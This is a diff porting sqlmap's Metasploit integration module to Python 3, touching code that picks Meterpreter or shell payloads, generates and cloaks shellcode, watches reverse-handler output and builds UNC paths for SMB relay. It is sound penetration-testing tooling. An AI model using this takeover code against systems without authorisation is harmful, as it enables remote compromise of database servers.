@@ -1,12 +1,13 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
 from __future__ import print_function
 
+import errno
 import os
 import re
 import select
@@ -22,12 +23,15 @@ from lib.core.common import dataToStdout
 from lib.core.common import Backend
 from lib.core.common import getLocalIP
 from lib.core.common import getRemoteIP
+from lib.core.common import isDigit
 from lib.core.common import normalizePath
 from lib.core.common import ntToPosixSlashes
 from lib.core.common import pollProcess
 from lib.core.common import randomRange
 from lib.core.common import randomStr
 from lib.core.common import readInput
+from lib.core.convert import getBytes
+from lib.core.convert import getText
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -45,11 +49,12 @@ from lib.core.subprocessng import blockingWriteToFD
 from lib.core.subprocessng import Popen as execute
 from lib.core.subprocessng import send_all
 from lib.core.subprocessng import recv_some
+from thirdparty import six
 
 if IS_WIN:
     import msvcrt
 
-class Metasploit:
+class Metasploit(object):
     """
     This class defines methods to call Metasploit for plugins.
     """
@@ -64,29 +69,11 @@ class Metasploit:
         self.payloadConnStr = None
         self.localIP = getLocalIP()
         self.remoteIP = getRemoteIP() or conf.hostname
-        self._msfCli = normalizePath(os.path.join(conf.msfPath, "msfcli"))
-        self._msfConsole = normalizePath(os.path.join(conf.msfPath, "msfconsole"))
-        self._msfEncode = normalizePath(os.path.join(conf.msfPath, "msfencode"))
-        self._msfPayload = normalizePath(os.path.join(conf.msfPath, "msfpayload"))
-        self._msfVenom = normalizePath(os.path.join(conf.msfPath, "msfvenom"))
-
-        if IS_WIN:
-            _ = conf.msfPath
-            while _:
-                if os.path.exists(os.path.join(_, "scripts")):
-                    _ = os.path.join(_, "scripts", "setenv.bat")
-                    break
-                else:
-                    old = _
-                    _ = normalizePath(os.path.join(_, ".."))
-                    if _ == old:
-                        break
-
-            self._msfCli = "%s & ruby %s" % (_, self._msfCli)
-            self._msfConsole = "%s & ruby %s" % (_, self._msfConsole)
-            self._msfEncode = "ruby %s" % self._msfEncode
-            self._msfPayload = "%s & ruby %s" % (_, self._msfPayload)
-            self._msfVenom = "%s & ruby %s" % (_, self._msfVenom)
+        self._msfCli = normalizePath(os.path.join(conf.msfPath, "msfcli%s" % (".bat" if IS_WIN else "")))
+        self._msfConsole = normalizePath(os.path.join(conf.msfPath, "msfconsole%s" % (".bat" if IS_WIN else "")))
+        self._msfEncode = normalizePath(os.path.join(conf.msfPath, "msfencode%s" % (".bat" if IS_WIN else "")))
+        self._msfPayload = normalizePath(os.path.join(conf.msfPath, "msfpayload%s" % (".bat" if IS_WIN else "")))
+        self._msfVenom = normalizePath(os.path.join(conf.msfPath, "msfvenom%s" % (".bat" if IS_WIN else "")))
 
         self._msfPayloadsList = {
             "windows": {
@@ -168,7 +155,7 @@ class Metasploit:
 
         choice = readInput(message, default="%d" % default)
 
-        if not choice or not choice.isdigit() or int(choice) > maxValue or int(choice) < 1:
+        if not choice or not isDigit(choice) or int(choice) > maxValue or int(choice) < 1:
             choice = default
 
         choice = int(choice)
@@ -186,7 +173,7 @@ class Metasploit:
         # choose which encoder to use. When called from --os-pwn the encoder
         # is always x86/alpha_mixed - used for sys_bineval() and
         # shellcodeexec
-        if isinstance(encode, basestring):
+        if isinstance(encode, six.string_types):
             return encode
 
         elif encode:
@@ -241,24 +228,21 @@ class Metasploit:
 
                     if not choice or choice == "2":
                         _payloadStr = "windows/meterpreter"
-
                         break
 
                     elif choice == "3":
                         _payloadStr = "windows/shell"
-
                         break
 
                     elif choice == "1":
                         if Backend.isDbms(DBMS.PGSQL):
                             logger.warn("beware that the VNC injection might not work")
-
                             break
 
                         elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                             break
 
-                    elif not choice.isdigit():
+                    elif not isDigit(choice):
                         logger.warn("invalid value, only digits are allowed")
 
                     elif int(choice) < 1 or int(choice) > 2:
@@ -522,7 +506,7 @@ class Metasploit:
                 if IS_WIN:
                     timeout = 3
 
-                    inp = ""
+                    inp = b""
                     _ = time.time()
 
                     while True:
@@ -554,14 +538,14 @@ class Metasploit:
                             pass
 
                 out = recv_some(proc, t=.1, e=0)
-                blockingWriteToFD(sys.stdout.fileno(), out)
+                blockingWriteToFD(sys.stdout.fileno(), getBytes(out))
 
                 # For --os-pwn and --os-bof
                 pwnBofCond = self.connectionStr.startswith("reverse")
-                pwnBofCond &= any(_ in out for _ in ("Starting the payload handler", "Started reverse"))
+                pwnBofCond &= any(_ in out for _ in (b"Starting the payload handler", b"Started reverse"))
 
                 # For --os-smbrelay
-                smbRelayCond = "Server started" in out
+                smbRelayCond = b"Server started" in out
 
                 if pwnBofCond or smbRelayCond:
                     func()
@@ -569,7 +553,7 @@ class Metasploit:
                 timeout = time.time() - start_time > METASPLOIT_SESSION_TIMEOUT
 
                 if not initialized:
-                    match = re.search(r"Meterpreter session ([\d]+) opened", out)
+                    match = re.search(b"Meterpreter session ([\\d]+) opened", out)
 
                     if match:
                         self._loadMetExtensions(proc, match.group(1))
@@ -585,14 +569,13 @@ class Metasploit:
                         errMsg += "to open a remote session"
                         raise SqlmapGenericException(errMsg)
 
-                if conf.liveTest and timeout:
-                    if initialized:
-                        send_all(proc, "exit\n")
-                        time.sleep(2)
-                    else:
-                        proc.kill()
-
-            except (EOFError, IOError, select.error):
+            except select.error as ex:
+                # Reference: https://github.com/andymccurdy/redis-py/pull/743/commits/2b59b25bb08ea09e98aede1b1f23a270fc085a9f
+                if ex.args[0] == errno.EINTR:
+                    continue
+                else:
+                    return proc.returncode
+            except (EOFError, IOError):
                 return proc.returncode
             except KeyboardInterrupt:
                 pass
@@ -615,7 +598,7 @@ class Metasploit:
         pollProcess(process)
         payloadStderr = process.communicate()[1]
 
-        match = re.search(r"(Total size:|Length:|succeeded with size|Final size of exe file:) ([\d]+)", payloadStderr)
+        match = re.search(b"(Total size:|Length:|succeeded with size|Final size of exe file:) ([\\d]+)", payloadStderr)
 
         if match:
             payloadSize = int(match.group(2))
@@ -626,11 +609,11 @@ class Metasploit:
             debugMsg = "the shellcode size is %d bytes" % payloadSize
             logger.debug(debugMsg)
         else:
-            errMsg = "failed to create the shellcode (%s)" % payloadStderr.replace("\n", " ").replace("\r", "")
+            errMsg = "failed to create the shellcode ('%s')" % getText(payloadStderr).replace("\n", " ").replace("\r", "")
             raise SqlmapFilePathException(errMsg)
 
         self._shellcodeFP = open(self._shellcodeFilePath, "rb")
-        self.shellcodeString = self._shellcodeFP.read()
+        self.shellcodeString = getText(self._shellcodeFP.read())
         self._shellcodeFP.close()
 
         os.unlink(self._shellcodeFilePath)
@@ -642,7 +625,7 @@ class Metasploit:
             self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "windows", "shellcodeexec.x%s.exe_" % "32")
             content = decloak(self.shellcodeexecLocal)
             if SHELLCODEEXEC_RANDOM_STRING_MARKER in content:
-                content = content.replace(SHELLCODEEXEC_RANDOM_STRING_MARKER, randomStr(len(SHELLCODEEXEC_RANDOM_STRING_MARKER)))
+                content = content.replace(SHELLCODEEXEC_RANDOM_STRING_MARKER, getBytes(randomStr(len(SHELLCODEEXEC_RANDOM_STRING_MARKER))))
                 _ = cloak(data=content)
                 handle, self.shellcodeexecLocal = tempfile.mkstemp(suffix="%s.exe_" % "32")
                 os.close(handle)
@@ -703,9 +686,9 @@ class Metasploit:
         self._runMsfCliSmbrelay()
 
         if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
-            self.uncPath = "\\\\\\\\%s\\\\%s" % (self.lhostStr, self._randFile)
+            self.uncPath = r"\\\\%s\\%s" % (self.lhostStr, self._randFile)
         else:
-            self.uncPath = "\\\\%s\\%s" % (self.lhostStr, self._randFile)
+            self.uncPath = r"\\%s\%s" % (self.lhostStr, self._randFile)
 
         debugMsg = "Metasploit Framework console exited with return "
         debugMsg += "code %s" % self._controlMsfCmd(self._msfCliProc, self.uncPathRequest)
